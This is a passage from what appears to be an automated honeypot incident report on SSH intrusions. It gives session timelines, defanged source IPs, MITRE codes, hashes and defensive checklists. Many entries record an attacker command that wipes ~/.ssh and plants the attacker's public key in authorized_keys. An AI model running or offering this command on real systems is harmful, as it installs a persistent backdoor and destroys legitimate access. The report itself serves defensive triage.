| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:45:10` | `cowrie.session.connect` |
| `2026-06-02 05:45:10` | `cowrie.client.version` |
| `2026-06-02 05:45:10` | `cowrie.client.kex` |
| `2026-06-02 05:45:11` | `cowrie.login.success` |
| `2026-06-02 05:45:11` | `cowrie.session.params` |
| `2026-06-02 05:45:11` | `cowrie.command.input` |
| `2026-06-02 05:45:11` | `cowrie.command.failed` |
| `2026-06-02 05:45:11` | `cowrie.log.closed` |
| `2026-06-02 05:45:11` | `cowrie.session.params` |
| `2026-06-02 05:45:11` | `cowrie.command.input` |
| `2026-06-02 05:45:11` | `cowrie.session.file_download` |
| `2026-06-02 05:45:11` | `cowrie.log.closed` |
| `2026-06-02 05:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.191.77[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.191.77[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03c29340f21

| Field | Detail |
|---|---|
| **Source IP** | `182.191.77[.]164` |
| **First Seen** | 2026-06-02 05:45 |
| **Last Seen** | 2026-06-02 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:45:13` | `cowrie.session.connect` |
| `2026-06-02 05:45:13` | `cowrie.client.version` |
| `2026-06-02 05:45:13` | `cowrie.client.kex` |
| `2026-06-02 05:45:13` | `cowrie.login.success` |
| `2026-06-02 05:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.191.77[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.191.77[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5126d3dd9732

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:47 |
| **Last Seen** | 2026-06-02 05:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:47:48` | `cowrie.session.connect` |
| `2026-06-02 05:47:48` | `cowrie.client.version` |
| `2026-06-02 05:47:48` | `cowrie.client.kex` |
| `2026-06-02 05:47:48` | `cowrie.login.success` |
| `2026-06-02 05:47:48` | `cowrie.session.params` |
| `2026-06-02 05:47:48` | `cowrie.command.input` |
| `2026-06-02 05:47:48` | `cowrie.command.failed` |
| `2026-06-02 05:47:48` | `cowrie.log.closed` |
| `2026-06-02 05:47:48` | `cowrie.session.params` |
| `2026-06-02 05:47:48` | `cowrie.command.input` |
| `2026-06-02 05:47:49` | `cowrie.session.file_download` |
| `2026-06-02 05:47:49` | `cowrie.log.closed` |
| `2026-06-02 05:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5adee9ef0698

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:47 |
| **Last Seen** | 2026-06-02 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:47:50` | `cowrie.session.connect` |
| `2026-06-02 05:47:50` | `cowrie.client.version` |
| `2026-06-02 05:47:50` | `cowrie.client.kex` |
| `2026-06-02 05:47:51` | `cowrie.login.success` |
| `2026-06-02 05:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2036d4e3378

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:48 |
| **Last Seen** | 2026-06-02 05:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:48:50` | `cowrie.session.connect` |
| `2026-06-02 05:48:50` | `cowrie.client.version` |
| `2026-06-02 05:48:50` | `cowrie.client.kex` |
| `2026-06-02 05:48:51` | `cowrie.login.success` |
| `2026-06-02 05:48:51` | `cowrie.session.params` |
| `2026-06-02 05:48:51` | `cowrie.command.input` |
| `2026-06-02 05:48:51` | `cowrie.command.failed` |
| `2026-06-02 05:48:52` | `cowrie.log.closed` |
| `2026-06-02 05:48:52` | `cowrie.session.params` |
| `2026-06-02 05:48:52` | `cowrie.command.input` |
| `2026-06-02 05:48:52` | `cowrie.session.file_download` |
| `2026-06-02 05:48:52` | `cowrie.log.closed` |
| `2026-06-02 05:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-494e20fd4b99

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:48 |
| **Last Seen** | 2026-06-02 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:48:54` | `cowrie.session.connect` |
| `2026-06-02 05:48:54` | `cowrie.client.version` |
| `2026-06-02 05:48:54` | `cowrie.client.kex` |
| `2026-06-02 05:48:55` | `cowrie.login.success` |
| `2026-06-02 05:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-925ce090b98a

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:50 |
| **Last Seen** | 2026-06-02 05:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:50:43` | `cowrie.session.connect` |
| `2026-06-02 05:50:43` | `cowrie.client.version` |
| `2026-06-02 05:50:43` | `cowrie.client.kex` |
| `2026-06-02 05:50:43` | `cowrie.login.success` |
| `2026-06-02 05:50:44` | `cowrie.session.params` |
| `2026-06-02 05:50:44` | `cowrie.command.input` |
| `2026-06-02 05:50:44` | `cowrie.command.failed` |
| `2026-06-02 05:50:44` | `cowrie.log.closed` |
| `2026-06-02 05:50:44` | `cowrie.session.params` |
| `2026-06-02 05:50:44` | `cowrie.command.input` |
| `2026-06-02 05:50:44` | `cowrie.session.file_download` |
| `2026-06-02 05:50:44` | `cowrie.log.closed` |
| `2026-06-02 05:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5370ed7a70e0

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:50 |
| **Last Seen** | 2026-06-02 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:50:47` | `cowrie.session.connect` |
| `2026-06-02 05:50:47` | `cowrie.client.version` |
| `2026-06-02 05:50:47` | `cowrie.client.kex` |
| `2026-06-02 05:50:47` | `cowrie.login.success` |
| `2026-06-02 05:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08ca281c4763

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:56 |
| **Last Seen** | 2026-06-02 05:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:56:25` | `cowrie.session.connect` |
| `2026-06-02 05:56:25` | `cowrie.client.version` |
| `2026-06-02 05:56:25` | `cowrie.client.kex` |
| `2026-06-02 05:56:25` | `cowrie.login.success` |
| `2026-06-02 05:56:26` | `cowrie.session.params` |
| `2026-06-02 05:56:26` | `cowrie.command.input` |
| `2026-06-02 05:56:26` | `cowrie.command.failed` |
| `2026-06-02 05:56:26` | `cowrie.log.closed` |
| `2026-06-02 05:56:26` | `cowrie.session.params` |
| `2026-06-02 05:56:26` | `cowrie.command.input` |
| `2026-06-02 05:56:26` | `cowrie.session.file_download` |
| `2026-06-02 05:56:26` | `cowrie.log.closed` |
| `2026-06-02 05:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf7c9c6799d

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:56 |
| **Last Seen** | 2026-06-02 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:56:28` | `cowrie.session.connect` |
| `2026-06-02 05:56:28` | `cowrie.client.version` |
| `2026-06-02 05:56:28` | `cowrie.client.kex` |
| `2026-06-02 05:56:28` | `cowrie.login.success` |
| `2026-06-02 05:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d456119d4c

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:56 |
| **Last Seen** | 2026-06-02 05:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:56:32` | `cowrie.session.connect` |
| `2026-06-02 05:56:32` | `cowrie.client.version` |
| `2026-06-02 05:56:33` | `cowrie.client.kex` |
| `2026-06-02 05:56:33` | `cowrie.login.success` |
| `2026-06-02 05:56:33` | `cowrie.session.params` |
| `2026-06-02 05:56:33` | `cowrie.command.input` |
| `2026-06-02 05:56:33` | `cowrie.command.failed` |
| `2026-06-02 05:56:34` | `cowrie.log.closed` |
| `2026-06-02 05:56:34` | `cowrie.session.params` |
| `2026-06-02 05:56:34` | `cowrie.command.input` |
| `2026-06-02 05:56:34` | `cowrie.session.file_download` |
| `2026-06-02 05:56:34` | `cowrie.log.closed` |
| `2026-06-02 05:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7dfd4a18447

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:56 |
| **Last Seen** | 2026-06-02 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:56:37` | `cowrie.session.connect` |
| `2026-06-02 05:56:37` | `cowrie.client.version` |
| `2026-06-02 05:56:37` | `cowrie.client.kex` |
| `2026-06-02 05:56:37` | `cowrie.login.success` |
| `2026-06-02 05:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5d02691838

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:58 |
| **Last Seen** | 2026-06-02 05:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:58:26` | `cowrie.session.connect` |
| `2026-06-02 05:58:26` | `cowrie.client.version` |
| `2026-06-02 05:58:26` | `cowrie.client.kex` |
| `2026-06-02 05:58:27` | `cowrie.login.success` |
| `2026-06-02 05:58:27` | `cowrie.session.params` |
| `2026-06-02 05:58:27` | `cowrie.command.input` |
| `2026-06-02 05:58:27` | `cowrie.command.failed` |
| `2026-06-02 05:58:28` | `cowrie.log.closed` |
| `2026-06-02 05:58:28` | `cowrie.session.params` |
| `2026-06-02 05:58:28` | `cowrie.command.input` |
| `2026-06-02 05:58:28` | `cowrie.session.file_download` |
| `2026-06-02 05:58:28` | `cowrie.log.closed` |
| `2026-06-02 05:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e9dfc77766

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:58 |
| **Last Seen** | 2026-06-02 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:58:30` | `cowrie.session.connect` |
| `2026-06-02 05:58:30` | `cowrie.client.version` |
| `2026-06-02 05:58:30` | `cowrie.client.kex` |
| `2026-06-02 05:58:31` | `cowrie.login.success` |
| `2026-06-02 05:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7f148bd0dd

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 06:00 |
| **Last Seen** | 2026-06-02 06:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 06:00:23` | `cowrie.session.connect` |
| `2026-06-02 06:00:23` | `cowrie.client.version` |
| `2026-06-02 06:00:24` | `cowrie.client.kex` |
| `2026-06-02 06:00:24` | `cowrie.login.success` |
| `2026-06-02 06:00:24` | `cowrie.session.params` |
| `2026-06-02 06:00:24` | `cowrie.command.input` |
| `2026-06-02 06:00:24` | `cowrie.command.failed` |
| `2026-06-02 06:00:25` | `cowrie.log.closed` |
| `2026-06-02 06:00:25` | `cowrie.session.params` |
| `2026-06-02 06:00:25` | `cowrie.command.input` |
| `2026-06-02 06:00:25` | `cowrie.session.file_download` |
| `2026-06-02 06:00:25` | `cowrie.log.closed` |
| `2026-06-02 06:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-199ab446e8bc

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 06:00 |
| **Last Seen** | 2026-06-02 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 06:00:27` | `cowrie.session.connect` |
| `2026-06-02 06:00:27` | `cowrie.client.version` |
| `2026-06-02 06:00:28` | `cowrie.client.kex` |
| `2026-06-02 06:00:28` | `cowrie.login.success` |
| `2026-06-02 06:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d003136df0f

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 06:02 |
| **Last Seen** | 2026-06-02 06:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 06:02:20` | `cowrie.session.connect` |
| `2026-06-02 06:02:20` | `cowrie.client.version` |
| `2026-06-02 06:02:20` | `cowrie.client.kex` |
| `2026-06-02 06:02:21` | `cowrie.login.success` |
| `2026-06-02 06:02:21` | `cowrie.session.params` |
| `2026-06-02 06:02:21` | `cowrie.command.input` |
